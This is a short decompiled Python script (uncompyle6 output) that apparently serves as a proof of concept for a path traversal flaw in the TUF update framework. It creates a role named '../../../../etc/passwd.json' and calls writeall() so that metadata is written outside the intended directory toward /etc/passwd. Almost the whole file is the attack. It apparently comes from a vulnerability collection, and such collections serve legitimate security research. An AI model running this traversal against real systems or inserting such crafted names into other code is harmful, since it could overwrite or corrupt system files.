# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 224_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 459 bytes
import tuf
repo = tuf.Repository()
repo.metadata_directory = "/path/to/metadata"
rolename = "../../../../etc/passwd.json"
role = repo.create_role(rolename)
role.add_target("target1", "sha256:1234567890abcdef")
repo.writeall()

# okay decompiling 224_1.pyc
